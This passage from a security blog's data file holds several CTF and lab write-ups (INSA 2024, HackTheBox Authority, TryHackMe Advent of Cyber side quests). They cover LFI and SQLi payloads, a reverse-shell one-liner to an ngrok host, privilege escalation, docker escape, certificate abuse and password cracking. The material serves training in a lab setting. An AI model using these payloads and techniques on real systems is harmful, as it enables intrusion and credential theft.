?page=...&amp;param2=...&amp;param3=.... Notice the first use of ? and then exclusively the use of &amp;.The 3 steps when doing information gathering when we face a website in a CTF environment are: Read the page : Look for usernames, passwords, domains, vhosts… Read the source code: Look for comments left by devs, look for interesting headers or interesting files (ex: js files) Launch a fuzzer: Launch tools like Gobuster or Ffuf to find interesting files or directoriesThe website doesn’t have much text, lets look at the source code by either using the shortcut CTRL+U or by right clicking on the page and select Read source code:As we can see, there is a comment (&lt;-- /var/www/flag.txt --&gt;) in the source code of the page. We can read the content of this file by replacing accueil.php in the URL by the path of the flag.txt file:And voilà, you got your first LFI validated.LFI 2This challenge is also an LFI but replacing the GET value as in the previous exemple won’t work. As you can see the structure of the website is the same:An interesting thing about LFI is that it allows us to read files and also get Remote Code Execution (RCE). Here we are only interested in reading files. We don’t have the path of the flag so why not reading the files we already know exists ? “But we don’t know any file” you may say. And you are partially right, but we know that there is an index.php, an accueil.php… So why not read them ?The problem is that they are PHP files. “Why is that a problem ?”. Because if we just ask to print the accueil.php (like it’s done by default), it will only print the HTML generated by the server from the PHP source code. If there is interesting code like passwords, connexion to a database or PHP comments, all of that won’t be printed in the source code of the page we receive in front of us. So one technique to read the full PHP code is to Base64 encode the content of the file to be able to read everything. To do so, we are using PHP Wrappers. A PHP Wrapper is like a bridge that helps PHP code talk to other systems or services easily. It simplifies tasks like sending requests, receiving responses, and handling data, making it convenient for developers to use external functionality within their PHP applications.We can use it like this to Base 64 encode the accueil.php file:http://ctf.insa-cvl.fr:1001/index.php?page=php://filter/read=convert.base64-encode/resource=acceuil.php Note that we only encoded once. A good habit would be to encode it multiple times (2 times is great).After using this payload, we get the following result:We can decode it in the terminal using echo \"base64_string\" | base64 -d but you can also use online tools or BurpSuite. And once decoded, we get the flag in the PHP comment:" }, { "title": "CTFs | CTF_INSA_2024 | Web | Attention_au_swap", "url": "/CTFs/CTF_INSA_2024/Web/Attention_au_swap/", "categories": "CTFs, CTF_INSA_2024, Web", "tags": "web, swap, vim", "date": "2024-02-05 00:00:00 +0100", "snippet": "Attention au swapIn this challenge, we are asked to demonstrate some kind of vulnerability regarding the text editor vim. The name of the challenge gives us a hint on where to look for (swap). First I searched swap vim and I found this link https://www.baeldung.com/linux/vim-swap-files. It explains what is a swap file and that if a file called {filename_whit_extention} is created then its swap file name will be .{filename_whit_extention}.swp. Now lets have a look at the website:As we can see, we have the index.php file. We can try to recover its swap file by searching the following URL:http://ctf.insa-cvl.fr:1004/.index.php.swpWhen the file is downloaded, we can open it with Vim recovery mode:vim -r .index.php.swpWhen Vim is opened, we see the following:We can now save the file as index.php by running th following command in Vim::q! index.phpAnd we can print in our terminal the flag by running the following command:head index.php" }, { "title": "CTFs | CTF_INSA_2024 | Systeme", "url": "/CTFs/CTF_INSA_2024/Systeme/", "categories": "CTFs, CTF_INSA_2024, Systeme", "tags": "PE, GTFOBins", "date": "2024-02-05 00:00:00 +0100", "snippet": "Find You’re PathHere we are given username and password for the user bob. We can ssh into the machine as follows:As you can see, when we perform sudo -l we see that we can run the vim command as any user or group (ALL:ALL) without the need to specify our password. Lets have a look at how we can get a root shell with Vim on GTFOBins:We run the provided command and we have now a root shell:We go into the /root folder and get the flag. Voilà:" }, { "title": "CTFs | CTF_INSA_2024 | Reseau", "url": "/CTFs/CTF_INSA_2024/Reseau/", "categories": "CTFs, CTF_INSA_2024, Reseau", "tags": "FTP, HTTP, Telnet, WPA", "date": "2024-02-05 00:00:00 +0100", "snippet": "RéseauFTPIn this challenge, we have a pcap file and we are tasked to retrieve bob’s password. We need to find its FTP password so lets filter by this protocol:We can see a Login successful. Lets Left Click &gt; Follow &gt; TCP Stream to see what happened in this session:As you can see, we have the password bobman75 for the user bob.TelnetThis is the same exercice as for the FTP but this time for the TELNET protocol. We can filter this protocol:Now we can do the same as before :Left Click &gt; Follow &gt; TCP StreamWe can click on the arrows to look at the next streams:And voilà, we can see in clear text the password bobIscrazy for the user bob.HTTPSame as before but for the HTTP protocol. We are tasked to find the phpmyadmin root password. We can use the following filter:http &amp;&amp; http.request.full_uri contains phpmyadmin or http &amp;&amp; http.location contains phpmyadminNow we can Follow TCP and we can see the username root and the password FLAG%7BServic3-is-Not-HTTpS%7D:We now URL decode: FLAG%7BServic3-is-Not-HTTpS%7D which gives us the flag:FLAG{Servic3-is-Not-HTTpS}WPA2Here, we have a Wifi communication using the protocol 802.11. You can refer to the following blog to get more information about wifi hacking CyberHackWe follow the given steps by first extracting the hash of the pcap file:Now we can crack it using hashcat:And voilà… We found the password iloveyou for the wifi named X-n0.Another method could be to use aicrack-ng. It will only need the pcap file to crack the password:FTP 2Here the flag is not directly in the communication stream but it is located in a file. Because we have sniffed all the trafic, we can export all the files that came through the communication. To do so, you can do the following:File &gt; Export Object &gt; FTP data &gt;Now you have the list of all the files that went through the communication. You can save it locally:And voilà… We have the flag in the image:" }, { "title": "CTFs | CTF_INSA_2024 | Realiste", "url": "/CTFs/CTF_INSA_2024/Realiste/", "categories": "CTFs, CTF_INSA_2024, Realiste", "tags": "CVE", "date": "2024-02-05 00:00:00 +0100", "snippet": "RéalisteLe monitoring est importantIn this challenge, we are tasked to become root of the machine. First we go to the login page and can log-in with the credentials admin:admin (before that other teams changed it).There is nothing that looks interesting on this website so can search for online available exploits for Eyes Of Netwok exploit One common website that list exploits is Exploit-DB:We can also locally find exploit using the searchsploit tool:After a bit of digging, I found this exploit https://github.com/h4knet/eonrce. For this to work, I only need to specify the website, my IP (here my ngrok) and my port. To do so, I launched my listener and my ngrok:Now I just have to run the exploit:When heading back to our listener, we have a root shell and we can now improve it :We can now read the flag at /root/flag.txtPwnMeIn this challenge, we are also tasked to become root of the machine.First, we can enumerate the website using Gobuster because there is nothing in the source code or on the page:As you can see, there are a lot of results. Lets look at the assets folder:![[realiste2_assets.png.p(https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/CTF_INSA_2024/photos/realiste2_assets.png)ng]]We notice a file called shell.php:As you can see, we can perform basic Linux command execution, lets try to execute a reverse shell command (and not be loud like the other teams uploading a lot of files):rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 4.tcp.eu.ngrok.io 14433 &gt;/tmp/fWe now have a shell as www-data, this user by default don’t have rights but as you can see, we can read the content of /home/debian/.htpasswd:This gives us the md5 hash of the user debian that we can crack offline using John or Hashcat but also online using crackstation:We now have the password of the user debian. We can run su debian and provide the found password:As we can see, we can run any commands as debian:So we can get a root shell as follows:And now we juste have to go to the /root folder and recover the flag:" }, { "title": "CTFs | CTF_INSA_2024 | Forensique", "url": "/CTFs/CTF_INSA_2024/Forensique/", "categories": "CTFs, CTF_INSA_2024, Forensique", "tags": "Forensique, Vi, SWP, bitlocker, john, keypass, firefox", "date": "2024-02-05 00:00:00 +0100", "snippet": "ForensicBitlocker 1In this challenge, we are given a disk.raw image that contains partition of a windows machine that has been ciphered using bitlocker. We can use the tool bitlocker2john to extract the password used to encrypt those partitions. We then use john to crack the passwords:Using fdisk we can see that a unit has a size of 512 bytes and that it starts at the 128th one.This allows us to decrypt the partition at the correct location. We can use dislockerto recover the decrypted partition:Now, we can mount the partition on one of our folder and recover the flag: Note that we needed to copy in an other folder the partition because it was only accessible in read-only. We may have been able to modify the rights of the file but this is easier :)Bitlocker 2In this challenge, we are given two files. A Bitlocker encrypted partition and a memory dump of a windows machine.I used volatility2docker for this challenge because Volatility2 has some issues some times. The use of docker images is great because you don’t have to install all the dependencies needed for the tool.I found this Github repository that talks about how to recover the content of a Bitlocker encrypted partition from a memory dump of the machine. First we need to add the Bitlocker script in the Volatility2 plugins list:Now we can analyse the image and we find it to be a windows10 machine:Now we need to recover the Full Volume Encryption Key (FVEK).The Full Volume Encryption Key (FVEK) is a cryptographic key used in full disk encryption (FDE) systems to encrypt and decrypt the entire contents of a storage volume. It serves as the primary encryption key for the entire volume and is typically generated randomly during the encryption process. The FVEK is used to protect the confidentiality of data stored on the disk by encrypting it, making the data unreadable without the key. It is essential for securing sensitive information and ensuring data privacy and security in scenarios where entire disk volumes need to be protected.We use the newly added plugin bilocker to export the FVEK:Because we had a mounted volume on the docker, we have the files directly on our machine. We use fdisk to check the size of the units:We run the dislocker tool as in the previous exercice but this time we specify the FVEK file we want to use, the disk image and the folder to mount. Then we copy the decrypted partition in another folder and we mount it to a last folder where we can now read the flag: Some interesting reading on the subject on LinkedInKeypassKeepass is a tool used to store credentials. It is a password manager. If the master password, that is used to cipher all the credentials, is weak, then we can have access to all the credentials stored in the Keepass file. We use keepass2john to recover the hash of the password protecting the file, then we use john to crack it:Now we can install KeepassXC on our computer and load the bob.kdbx file in it. We are asked for a password and we specify spongebob. We get the following result:As you can see, we get the flag from the Keepass file. You may not have the flag showed directly. You may have to click on the eye to be able to see the value that by default is replaced by several dots.Connaissez-vous la forensique 1Here, we are tasked to recover the password of the Firefox session and we are given several folder. I found the tool firepwd that allows us to recover all the password saved in Firefox if we specify a profile. We just have to run the following command:python firepwd/firepwd.py -d Roaming/Mozilla/Firefox/Profiles/aiaj08g4.default-releaseAnd now we have at the bottom of the terminal the password for bob’s account on amazon:Connaissez vous le ForensicOn this challenge, we need to recover the content of the Notepad application. I did a simple research on internet and found the following blog . It gives us all the command we need to run to retrieve the content of our application.I used the docker image of Volatility3. In the version 3, we don’t need to specify the profile of the memory image we have. This allows me to directly recover the list of all the process and recover the PID of Notepad (4100): Note the use of &gt; to store the result of the command. It is a good practice to store the result of the commands we run in a file when using Volatility because it may take time to run it several times if we don’t save the results.Now we can dump the memory of this process:This gives us a file called pid.4100.dmp and we can use the string and grep commands to recover the flag: Note the use of -e l in the string command. If you dont specify to use the little endian mode, you won’t be able to get any result. This is because Notepad stores text in this format." }, { "title": "CTFs | HackTheBox | Machines | Authority", "url": "/CTFs/HackTheBox/Machines/Authority", "categories": "CTFs, HackTheBox, Machines", "tags": "CTF, HackTheBox, Machines, Windows, Certificate, PFX, SeMachineAccountPrivilege", "date": "2024-01-12 00:00:00 +0100", "snippet": "AuthorityThis Medium machine took me a several days if not a week to complete. I hope you will enjoy this write-up as much as I enjoyed rooting this machine :)EnumerationAs always, a good nmap scan is great:As we can see, we have a lot of open ports. We can notice that port 80 and 8443 are web interfaces. After running a gobuster scan and reading the source code of port 80 I didn’t found anything so I looked at the port 8443. We are automatically redirected to the /pwm page and we are asked to provide credentials.I tried the default admin:admin credentials and got the following error:So now we know that there is a user called svc_ldap.If we go to the Configuration Manager or the Configuration Editor, we are asked for a password only. After a bit of digging, I didn’t find much on this interface neither.SMB Information GatheringI decided to look at the SMB shares:As we can see, there is a Development share that we can access. I used smbget to recover the whole shared folder:As we can see, there is a folder called Ansible. Ansible is an open-source automation tool used for configuration management, application deployment, and task automation in IT environments, enabling easy and efficient management of infrastructure and software through declarative code.I first search for usernames:With this command, I found several users and now I tried to find password the same way:This command gave me five passwords, but none of them allowed me to connect to the web interface on port 8443. In the file Automation/Ansible/PWM/defaults/main.yml, we can notice some weird credentials:They don’t look like passwords nor hash. After a bit of digging, I found this blog that tells us how we can crack those secrets. So I copy every Ansible Vault blob (the $ANSIBLE_VAULT;1.1;AES256... part) and saved it in one file per each blob. I then used ansible2john to convert the blob into a hash that John can crack:We found the password !@#$%^&amp;*. I tried to connect with it, but it didn’t work… obviously. This is the password for Ansible not the web interface. I found this article that explains how to recover the Ansible Vault clear text with the password: Note that every blop has the same password. Even if all 3 hash are different, they gave us the same !@#$%^&amp;* password.PWM InterfaceThe user password interface didn’t seem to work, so I tried to connect to the Configuration Manager. I manage to connect with the password pWm_@dm!N_!23 and I get this page:After downloading every file I could, I noticed that in the configuration file PWMConfiguration.xml (that we can download via the Download Configuration button) there is in the comment this:In the same file we have the user svc_ldap that we found earlier but with some strange looking encrypted password:I added the &lt;property type=\"storePlaintextValues\"&gt;true&lt;/property&gt; property in the properties section and uploaded it via the web interface. Then, the web service restarts, and we can connect back with the same password and download again this file:User.txtNow that we have the credentials for svc_ldap, we can connect to the machine and get the user flag:Privilege EscalationAfter a bit of digging on the machine and not finding anything, I decided to run winpeas. This tool is an equivalent to LinPEAS for Linux. I found that I can authenticate to the machine with certificates:After some research, I found that the tool Certify can help us. The main blog about certificate attacks that I found where HackTricks, Specteros and Exploit NotesI ran the command specified by Hacktricks to see the vulnerabilities: Note that to upload Certify.exe when we have our evil-winrm session you just have to use the command upload Certify.exe. If you have it in your current directory. You may need to use ../ if you have it in a previous folderAs we can see on the upper screenshot, we have a vulnerable template called CorpVPN. The inconvenient is that only Domain Admins, Domain Computers and Enterprise Admins can leverage this template. Here, I thought that I was blocked… But looking at our privileges, we can see that we have SeMachineAccountPrivilege:This means that we can add a computer in the domain with our own credentials. Note that we can’t do it with the current session because we are not admin neither on the domain nor an enterprise one and we don’t have the computer password.To add a computer easily, we can use the impacket tool impacket-addcomputer:Now that we added our computer to the domain, we can ask nicely for the administrator certificate thanks to certipy :): Note that the specified certificate authority is AUTHORITY-CA. This is stated in the Certify.exe command above. For some unknown reason, the certipy command failed sometimes even if it has a correct syntax so don’t mind running it several timesNow, we have the certificate in the pfx format, so I thought that I would have to do as in the Timelapse HTB machine but this didn’t work since we don’t have the password of the certificate.After a bit of digging, I found the tool passthecert.py that could do like a PTH (Pass The Hash) but with certificates. As specified at the top of the README file, I need to use certipy to extract the certificate and the RSA Private Key:As we already added our own computer, I jumped this part of the README file and went directly to the Change a password of a user part and tried to change the Administrator password:Root.txtWe have successfully changed the Administrator password and can now connect to the machine with it and… Voilà, we have the root.txt flag:" }, { "title": "CTFs | TryHackMe | AdventOfCyber2023 | Side Quest Day 4", "url": "/CTFs/TryHackMe/AdventOfCyber2023/SideQuest_Day4", "categories": "CTFs, TryHackMe, AdventOfCyber2023", "tags": "Flask, Werkzeug, SQLi, Side Quest, THM", "date": "2023-12-28 00:00:00 +0100", "snippet": "Side Quest - Day 4In this challenge, we need to become root, so let’s start with the enumeration phase.EnumerationAs we can see, we only have two open ports:We go see the website and notice that we can download the three images that we see:If we look carfully at the source code, we can see what looks like an SQLi:SQLiWe try to reach the image with id=0 and we get this beautiful error from Flask:This means that we should have a Werkzeug console at /console:This console is protected with a PIN but there is a technique to recover it. I won’t go into too much detail on how I generated it but you can read my write-up of a previous CTF here to have a better understanding.So, let’s see if we can leverage our SQLi to get an LFI and be able to read interesting files on the server:LFIThe payload id=0' union select all concat('file:///etc/passwd')-- - allows us to download the /etc/passwd file:I now used this script to download all the necessary files to recover the pin.Thanks to this I know that the user is mcskidy, I have the machine ID, the node UUID, the mod name is flask.app and the app name is Flask. The path of the app is given in the error (/home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py).We just have to get the hexadecimal value of the node UUID. Here we have 02:77:eb:08:09:ed which is 2714067536365 in decimal. I now use my script to generate the PIN: Note that I put the cron.service (available in the cgroup file). But for some reason, sometimes it worked with it appended to the machine ID and sometimes without. So be aware of that.RCEI now head back to the console and get the access:Now we can have RCE running commands like __import__('os').popen('whoami\"').read() but we can also use it to get a reverse shell:We now have access to the server and can recover the user.txt flag in our home directory:As we know from the previous steps, the app is in our home directory so we can now have full access to the code:We notice a .git folder. We can search for previous interesting commits:Let’s check the difference from the code we have and this one:As we can see, we have a password that was changed. Let’s try to use it for our user:Privilege EscalationSo the deleted password was the one for the user mcskidy. Now we can check the /opt/check.sh script to try getting a root shell:As we can see, the /opt/check.sh uses its own .bashrc file and start the program from our home directory. As we saw on the sudo -l command, our home directory is in the secure_path. This means that when we run the script as the root user, we will have our home directory in the path. So if we have our reverse shell in our home directory, it will be loaded.But the source code of the check.sh script has only absolute path for the different binaries. But if we look at the /opt/.bashrc file, we can see something that isn’t present in the one of mkscidy:Because the # is a comment in bash, this means that we only have to understand what comes before it. enable -n means that it will disable the [ command. This [ is present in our check.sh file. This means that the [ will not be interpreted as part of the if statement. So we could try to have a reverse shell in a file called [. For more information about the enable -n you can check out this blog.So we just have to create our reverse shell into our home directory and we have it ready to go:And voilà, we have our last flag and the yeti’s key:" }, { "title": "CTFs | TryHackMe | AdventOfCyber2023 | Side Quest Day 3", "url": "/CTFs/TryHackMe/AdventOfCyber2023/SideQuest_Day3", "categories": "CTFs, TryHackMe, AdventOfCyber2023", "tags": "Vim, Nano, Docker, Side Quest, THM", "date": "2023-12-28 00:00:00 +0100", "snippet": "Side Quest - Day 3EnumerationIn this challenge, we are just given the an IP address. So we start our enumeration phase by running our nmap: As you can see, I used only -sV. This is because the result of -A (&lt;=&gt; -sC -sV) can’t be contained in a screenshot :)As we can see, we got a lot of open ports. The port 80 gives us an error when we try to access it, so I search for anything else on the other ports. We can connect to the ftp as anonymous on port 8075 and we can collect all the files:We get the first flag in flag-1-of-4.txt. Now we look at the flag-2-of-4.sh and we see this:This means that it is stored in the environment variable of the machine. So if we can run echo $FLAG2, we could get the flag.FootholdAs we can see, there is Nano and Vim on ports 8095 and 8085???? What is that ???We know that we can run command via those editors. Lets connect to vim using the following command:telnet IP 8085We now have access to Vim running on the server:We can recover the second flag by running the command::echo $FLAG2This prints us the flag in Vim.Now I want a shell on the machine. But when I try to execute :!sh I get the following error:We can use Nano or Vim as an ls command. In nano, we just need to press CTRL+R followed by CTRL+T and we can browse every file/directory on the server:Vim can also do that but it is less pretty and less easy to use. To do so in Vim, will use the python3 interpreter incorporated in it, but we will talk about it a bit later.After roaming around with nano, I found some files that look strange like /usr/frosty/sh or /etc/passwd that is writeable. What is strange is that there is no binary in the /bin and /usr/bin folder and there are no default binaries like sh, ls, find or chmod in /usr/sbin… Strange…But without a shell I won’t be able to do anything interesting, so I need to find a way to create my own.When looking at the Vim version (:version), we see that there is python3 included in Vim. That’s cool because it is not installed on the machine so we may be able to run some scripts.We can now run python3 commands like the one below, but it would be better if we could use all the binary we want:python3 import os; print(os.listdir(\"/tmp/\"))Getting a shellI uploaded via the FTP all these binaries sh, ls, id, cat, grep, find, mv, cp, chmod, mkdir, dirname, sed, touch, head, sleep, capsh. This will allow me to test a lot of commands. After uploading all these commands in the FTP, I need to move them to the /tmp folder because we don’t have rights on the /tmp/ftp one. To move all those files, I used the python3 command:python3 import shutil; shutil.copyfile(\"/tmp/ftp/sh\", \"/tmp/sh\"); shutil.copyfile(\"/tmp/ftp/ls\", \"/tmp/ls\"); shutil.copyfile(\"/tmp/ftp/id\", \"/tmp/id\"); shutil.copyfile(\"/tmp/ftp/cat\", \"/tmp/cat\"); shutil.copyfile(\"/tmp/ftp/grep\", \"/tmp/grep\"); shutil.copyfile(\"/tmp/ftp/find\", \"/tmp/find\"); shutil.copyfile(\"/tmp/ftp/mv\", \"/tmp/mv\"); shutil.copyfile(\"/tmp/ftp/cp\", \"/tmp/cp\"); shutil.copyfile(\"/tmp/ftp/chmod\", \"/tmp/chmod\"); shutil.copyfile(\"/tmp/ftp/mkdir\", \"/tmp/mkdir\"); shutil.copyfile(\"/tmp/ftp/dirname\", \"/tmp/dirname\"); shutil.copyfile(\"/tmp/ftp/sed\", \"/tmp/sed\"); shutil.copyfile(\"/tmp/ftp/touch\", \"/tmp/touch\"); shutil.copyfile(\"/tmp/ftp/head\", \"/tmp/head\"); shutil.copyfile(\"/tmp/ftp/sleep\", \"/tmp/sleep\"); shutil.copyfile(\"/tmp/ftp/capsh\", \"/tmp/capsh\")With all my files in the /tmp folder, I now need to give them the execution right:python3 import os;os.chmod(\"/tmp/sh\", 0o777) ;os.chmod(\"/tmp/ls\", 0o777) ;os.chmod(\"/tmp/id\", 0o777) ;os.chmod(\"/tmp/cat\", 0o777) ;os.chmod(\"/tmp/grep\", 0o777) ;os.chmod(\"/tmp/find\", 0o777) ;os.chmod(\"/tmp/mv\", 0o777) ;os.chmod(\"/tmp/cp\", 0o777) ;os.chmod(\"/tmp/chmod\", 0o777) ;os.chmod(\"/tmp/mkdir\", 0o777) ;os.chmod(\"/tmp/dirname\", 0o777) ;os.chmod(\"/tmp/sed\", 0o777) ;os.chmod(\"/tmp/touch\", 0o777) ;os.chmod(\"/tmp/head\", 0o777) ;os.chmod(\"/tmp/sleep\", 0o777);os.chmod(\"/tmp/capsh\", 0o777);os.chmod(\"/tmp/docker\", 0o777) Note the use of the python chmod. We are not setting the value as 777 but as 0o777 to use the octal representation of the rights.Now we should be able to run !/tmp/sh:Privilege EscalationNow, we can try to privesc. Unfortunately, tools like Linpeas won’t work because it needs a lot of binaries that are not on this machine… But as we saw earlier, there is a /usr/frosty/sh file that caught our attention. If we look at the file, it is empty:What if we put our /tmp/sh in this file ? Well it doesn’t change anything :Or maybe it changed something we didn’t think was directly linked to it ? If we get back to our nmap scan, we see that there is a port 8065 opened that we didn’t use for now. And we didn’t use it because when we tried to connect to it we got some errors, but now that we changed this sh binary, we get a beautiful root shell:And we get the root flag that is the 3rd one:Escaping the whaleAs we can see, we have a .dockerenv, that is a file generally located in docker containers. This means that we need to escape the container to be able to get the last flag.To escape a container, the easiest way is to have a volume that is linked to our container from the host and to mount the host file system in our docker. To do so, we need to do the following:The cat /proc/cmdline allows us to recover the UUID or, in this case, the PARTUUID. This value allows us to get the path to the underlying host filesystem. In a Docker container, the concept of UUID (Universally Unique Identifier) or PARTUUID (Partition UUID) is typically associated with the host system rather than the container itself. Docker containers share the kernel of the host system and do not have their own dedicated kernel or access to low-level hardware details. You can find more information on how to escape a docker container via the Hacktricks blog.We now run the findfs command on this PARTUUID to recover the underlying host filesystem:But now, we have a problem. There is no mount binary on this system and I can’t use the mount binary from my kali since it is a Debian system and not an Ubuntu one. So what I did, and it may be hardcore just for this task, but I went on my Ubuntu VM sent it to my Kali and uploaded it via the FTP :)As we can see, we have successfully mounted the volume to our /mnt-test folder and have now access to the host:We can go into the /mnt-test/root folder and recover the final flag and the yetikey3.txt:" }, { "title": "CTFs | TryHackMe | AdventOfCyber2023 | Side Quest Day 1", "url": "/CTFs/TryHackMe/AdventOfCyber2023/SideQuest_Day1", "categories": "CTFs, TryHackMe, AdventOfCyber2023, RDP", "tags": "RDP, Mimikatz, RDPReplay, Side Quest, THM", "date": "2023-12-28 00:00:00 +0100", "snippet": "Side Quest - Day 1In this challenge, we are given a wireshark capture called VanSpy.pcapng. When we open it with wireshark, we just see the following:The protocol 802.11 is the one used for Wifi communication. Because we don’t have any other protocol, we guess that we have to crack the wifi password to recover the traffic. To do so, we are going to export the hash of the Wifi password and crack it using hashcat. I found this blog that explains a lot about Wifi attacks and in our case how to recover and crack the hash of the Wifi. First we run the following command:hcxpcapngtool -o VanSpy.hash VanSpy.pcapngWe get some output like this:But what is interesting is that we recovered the hash of the Wifi in our text file:We can now run hashcat on it like so:hashcat -m 22000 VanSpy.hash /usr/share/wordlists/rockyou.txt To know which mode to use with hashcat just go to the hashcat website and search for a similar-looking hash.The password is pretty weak so we find pretty fast the clear text password Christmas:We now have to specify it in our wireshark. To do so, we go to the Edit menu, then in Preferences, then in the Protocols subsection we search the protocol IEEE 802.11 and specify the Decryption Key:We specify the key as follows:Now we can search in our Wireshark file as we would have done in a normal capture. We can search for TCP, HTTP, FTP traffic… After a bit of digging, we can see that there is a use of the port 4444… Which is the default port for Metasploit… Should be interesting:As we can see, there are a lot of PSH, ACK. This means that data are exchanged here. If we right click on on of them and select Follow &gt; TCP Stream like this:We get the following result:Mmmmh… Looks like a non-standard user we got here… What we see is that the user is running as Administrator and run Mimikatz commands to increase its privileges to NT AUTHORITY\\SYSTEM and export the RDP certificate:Thanks to our attacker, we get the content of the LOCAL_MACHINE_Remote Desktop_0_INTERN-PC.pfx certificate because he converted it to base64:For some reason converting the base64 directelly from the terminal didn’t work so I used Cyber Chef to recover the original content of the file.Now we have our LOCAL_MACHINE_Remote Desktop_0_INTERN-PC.pfx we should be able to recover the private key and decode the RDP traffic… But it seems like there is a password…After trying to crack it using rockyou (unsuccessful) I search on the internet for a way to recover it… All to get to know that it was… mimikatz…So we run the previous command and specify the password as mimikatz and we get a pretty server.pem private key:We can remove the header to just keep the part that starts with -----BEGIN PRIVATE KEY----- and we then specify it in the Protocols section (as we saw earlier) but this time in the RDP section: More information about RDP decryption can be found on this hackingarticles blog and this paloaltonetworks one.We then specify the IP address of the server (the one with the port 3389), the port 3389, the protocol tpkt and the path of the private key:When we search for RDP in the search bar, we now have plenty of results:Here I was blocked… I tried to look at every packet, but didn’t find anything… All the packets had non-printable characters so it was a dead end… Or was it ?I then realised that RDP is like a video stream, so maybe we could recover this video ? I search for a tool that would do that and found this incredible tool pyrdp. I also found this blog from kalilinuxtutorials that helped me understand how to use it.So I exported the PDU by clicking on the File menu, then Export PDUs to file and we select OSI Layer 7. Now we have some RDP traffic without any colour: A Protocol Data Unit (PDU) in Wireshark refers to a unit of data at the transport layer of a network protocol. When exported from Wireshark, a PDU capture typically contains the raw data exchanged between network devices during communication. PDUs are useful for analyzing and troubleshooting network issues, providing insights into the structure and content of data packets.We then save it as a pcap file: Note that the format pcap is important. Using the default pcapng will not work for the tool pyrdp.I ran the pyrdp in a venv to have less trouble with dependencies. I ran the following commands:python3 -m venv venvcd pyrdppip3 install -U -e '.[full]'cd ..We then run the following command to export the PDUs in a format that pyrdp understands:python3 pyrdp/pyrdp/bin/convert.py -o py_rdp_output export_pdu.pcap And we get this beautiful output:For some unknown reason the pyrdp-player wouldn’t run when using its binary from the venv so I ran it from the docker like so:sudo docker run -v \"$PWD/py_rdp_output:/pwd\" -e DISPLAY=$DISPLAY -e QT_X11_NO_MITSHM=1 --net=host gosecure/pyrdp pyrdp-playerWe have this window that pops up:We go to the File &gt; Open section and select in our folder the file called [STRIP].pycap and we open it: Note that we need to look in OUR directory. Because we are using the docker image, it is not in the default folder that is open when you get to this menu. You need to go in the /pwd folder because this is the name I gave in the docker command (-v \"$PWD/py_rdp_output:/pwd\").We get this window that is AWESOME!!! Let me explain. Now, we have the full replay of the RDP communication that went through the wireshark capture. And what is fantastic is that we have the key pressed by the user and also the content of the clipboard!!!We now just have to press play and wait for the answers to come to us:And we now have the key to validate the challenge." }, { "title": "CTFs | TryHackMe | AdventOfCyber2023 | QR Codes", "url": "/CTFs/TryHackMe/AdventOfCyber2023/QR_Codes", "categories": "CTFs, TryHackMe, AdventOfCyber2023, QR_Codes", "tags": "QR Codes, THM", "date": "2023-12-28 00:00:00 +0100", "snippet": "IntroductionTo be able to participate in the Side Quest challenge, we had to find the URLs to the different challenges:First QR CodeLinkedInThe first one is, as specified earlier, on their social media. On the Advent Of Cyber 2023 they give us the list of their social media:I chose to start by LinkedIn and continue in order. So to find it on LinkedIn, I search for all the posts from TryHackMe and found this one:We click on the link and get the first QR Code.DiscordThe Discord QR code was easy to find, we just had to search the pinned images on the Side Quest channel of the Discord. We find the following:This gives us the link to the QR Code. The link to the message is here.TwitterGoing on Twitter, we find the following post:We get the link to the 3rd QR Code.Side QuestThe last QR Code was free. Indeed, we just had to head to the Side Quest page and we find it lying around:I then downloaded all of them and created a python script (available here) to merge them together and to read it. We then get the following result:We now have access to the first Side Quest at https://tryhackme.com/jr/adv3nt0fdbopsjcapYou can see the write up of this challenge hereSecond QR CodeThe second one was the harder to get I believe. At the end of the 6th day of the Advent of Cyber we can see this:This task was about an introduction to buffer overflow. Even if this is a pretty complex attack, they managed to make it simple and fun.Let’s get back to our initial goal. We need to find the QR Code. In a glitch ??? I didn’t understand what I was looking for…To sum up, in this challenge, we can modify our name. But all the variables are following each other:So if we have a name longer than 12 characters, we can specify values for the other variables.To start, we need to earn some cash. We can hit the computer 16 times and specify a 16 long name:As we can see, we paid one coin for each letter and we now have the name AAAAAAAAAAAAAAAA and we have 1094795585 coin. That’s great. Now we can go to the store and buy whatever we want:As we can see, the IDs of each product is an hexadecimal character. So what if we have the items from 0 to f ? As we saw earlier on the second image of this part, the items are at the end of the memory. We need to right 4*11 (44) characters (as a padding) and then specify our items.So let’s specify our name as 44 A’s and then right the string 0123456789abcdef to see what whe get:When we press enter, we get the following items:The value 0 wasn’t an item but every other hexadecimal value was an item and we got them all !!!When we go to the tree and interact with it we can see all our items on it:This only gives us the flag… Not the QR Code… I decided to find a glitch on the gates or on the house but couldn’t find anything…I then decided to head back to the merchant:If you can see, he tells us that I have the yeti’s badge, but the correct one is blue… I can buy it to him. When we skip the dialogue, we get directly to the store. We can imagine that with the right amount of money we could pay for the yeti’s badge instantly. Let’s get some money :)We started with a bunch of As, I changed to replace all the As by some Zs but it wasn’t enough. I decided to check on the ASCII table to search for a greater value than Z: To see the ASCII table from your terminal on Linux, run the command man ascii.As we can see, the } character gives us a good chance to get enough money. So with 16 } and I got 2105376125 coins:I first had to empty my inventory because it was full and then bought the item with the ID a:As you can see on the images, there is a new character. Is it… The GLITCH ???This looked like a riddle at first… So we understand that we need to change our name as Snowball (because we have the cat character), we need to set the merchant name to Midas and the name changer’s name to Ted. We also need exactly 31337 coin and to do the 30 lives secret…So obviously, because each variable are following each other, we need to first change the name changer’s name, then the merchant one, then the coin and finally our name.So we can use just a padding of 28 As followed by Ted:As we can see, the name changed to Ted. We now need to do the same for Midas with a padding of 16 As:We now need to specify the coin value to 31337. But we need to be careful because by setting our name to Snowball we will use 8 coins. So we need to specify an amount of 31337+8 which is 31345. But 31345 is a decimal value. We need to change it to hexadecimal and finally to text so we can enter this text value after the padding:So we need to change the value of 7A71 as a text and put it after our padding and it should be ok. So the text value is zq:But we still have a A at the end that is changing the value of our coin wallet. Let’s set first zqA and after that the last bit is also None we will put zq:Uhhh wait… We have 29050 but we should have 31345 ??? Oh wait, this is because zq &lt;=&gt; 7A71 and 29050 &lt;=&gt; 717A… This means that we need to put qz instead of zq to have 31345 coins:Let’s now change our name to Snowball:As we can see, we have 31337 coins as asked by the glitch ;)We now need to do something regarding the 30 lives secret… I didn’t know what that means so I typed it on my search engine and found this Wikipedia page. It is in fact the Konami Code. This is a well-known cheat code for many gamers:So I went to the glitch and used my arrow keys to do the 